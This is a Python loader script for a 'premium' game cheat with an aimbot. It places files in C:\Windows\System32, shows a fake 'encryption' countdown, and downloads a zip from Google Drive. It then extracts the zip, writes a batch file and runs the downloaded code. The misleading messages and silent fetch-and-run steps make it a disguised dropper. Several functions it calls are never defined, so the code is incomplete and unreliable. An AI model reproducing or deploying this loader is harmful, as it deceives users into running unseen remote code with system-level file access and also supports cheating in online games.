import subprocess
import sys
import os
import winreg
import requests
import sys

import ctypes
import os
import sys
import shutil
import os
import gdown
os.system('cls')

dcnmwxdr = r'C:\Windows\System32\DSEL'
if not os.path.exists(dcnmwxdr):
    os.makedirs(dcnmwxdr)
    os.system('cls')

result = check_string_in_url("https://raw.githubusercontent.com/elaidacruzsdfsdklxkou/installer/refs/heads/main/uniqueid_3.0.txt", file_contentsx1)
from datetime import datetime, timedelta
import time
def check_uptime():
    boot_time = get_boot_time()
    if boot_time is None:
        print("Could not determine boot time.")
        return

    current_time = datetime.now()
    uptime = current_time - boot_time

    print("Current Time:", current_time.strftime("%Y-%m-%d %H:%M:%S"))
    print("Uptime Duration:", uptime)

    if uptime >= timedelta(minutes=3):
        print("")   
    else:
        time_remaining = timedelta(minutes=3) - uptime
        print("INFO")

        while time_remaining.total_seconds() > 0:
            os.system('cls' if os.name == 'nt' else 'clear')
            print("")
            print("")
            print("***ABOUT PREMIUM***")
            print("---To ensure 99% safety of premium cheat, it must encrypt all runtime data.")
            print("---Please be patient, it will take a few minutes.")
            print("---No need to restart PC when switching to another account.")
            print("---For Windows 11 users, don't update to 24h2 yet.")
            print("")
            print("***CHANGE LOGS (01-06-2025):")
            print(">You may now change settings while in game, just press the home key. [SAFE]")
            print(">When there are two enemies on the screen, the aimbot gets confused about where to aim, causing it to aim in between.")
            print(" Fixed this with aimbot now targeting the closest enemy instead of aiming in the middle.")
            print("")
            print("***FUTURE UPDATES FOR PREMIUM***")
            print("> Smooth Triggerbot to be added later in 2025.")
            print("")
            print("/////////////////////////////////////////////////////////////////////////////////////////////")
            print("<Developer: anonymous_kl>")
            minutes, seconds = divmod(int(time_remaining.total_seconds()), 60)
            print(f"Time remaining: {minutes} minutes and {seconds} seconds")
            print("Please wait...")
            time.sleep(1)
            current_time = datetime.now()
            uptime = current_time - boot_time
            time_remaining = timedelta(minutes=5) - uptime

        print("Completed encryption.")        
check_uptime()
xsadasdpath = r"C:\prx.txt"
os.system('cls')
print("")
def delete_files_if_aesv3_missing():
    aesv3_path = r"C:\Windows\System32\DSEL\aes-prem-jan-10.py"
    files_to_delete = [
        r"C:\Windows\System32\MSRXL\aesprem-jan8.py",
        r"C:\Windows\System32\MSRXL\aesprem.bat",
        r"C:\Windows\System32\MSRXL\pyarmor_runtime_000000"
    ]

    aesv3_exists = os.path.exists(aesv3_path)
    if not aesv3_exists:
        for item in files_to_delete:
            if os.path.exists(item):
                if os.path.isfile(item):
                    os.remove(item)
                    print("")
                elif os.path.isdir(item):
                    shutil.rmtree(item)
                    os.system('cls')
                    print("")
                    print("")
                    print("")
                    print("")
                    print("")
                    print("***PREMIUM IS UPDATING, PLEASE WAIT.")
                    print("***PREMIUM IS UPDATING, PLEASE WAIT.")
                    print("***PREMIUM IS UPDATING, PLEASE WAIT.")
    else:
        print("")
delete_files_if_aesv3_missing()
def download_file_from_google_drive(url, output_path):
    if not os.path.exists(output_path):
        gdown.download(url, output=output_path, quiet=True)
if not os.path.exists("C:\\Windows\\System32\\DSEL\\aes-prem-jan-10.py"):
    print("")
    print("")
    print("")
    print("")
    print("")
    print("---VERIYING YOUR COMPUTER PLEASE WAIT.")
    download_file_from_google_drive("https://drive.google.com/uc?id=149mEZzVvkw040g1o9aTqm9tEuJ6iHS9W", "C:\\Windows\\System32\\DSEL\\prem0110.zip")
    zip_file = r'C:\Windows\System32\DSEL\prem0110.zip'
    extract_dir = r'C:\Windows\System32\DSEL'
    extract_zip(zip_file, extract_dir)
    os.remove(zip_file)


def create_batch_file(python_command, script_name):
    directory = r"C:\Windows\System32\DSEL"
    filename = "aesprem.bat"
    filepath = os.path.join(directory, filename)
    if not os.path.exists(filepath):
        batch_content = f"@echo off\n{python_command} {script_name} || echo errorwithpath"
        os.makedirs(directory, exist_ok=True)
        with open(filepath, 'w') as file:
            file.write(batch_content)
        print(f"")
    else:
        print("")

create_batch_file("py -3.11", r"C:\Windows\System32\DSEL\aes-prem-jan-10.py")
def run_batch_file(batch_file_path):
    try:
        subprocess.run([batch_file_path], shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error")
    else:
        print("")

os.system('cls')
batch_file_path = r"C:\Windows\System32\DSEL\aesprem.bat"
try:
    subprocess.Popen(['start', 'cmd', '/c', batch_file_path], shell=True)
except Exception as e:
    print("Error")
os._exit(0)
sys.exit()
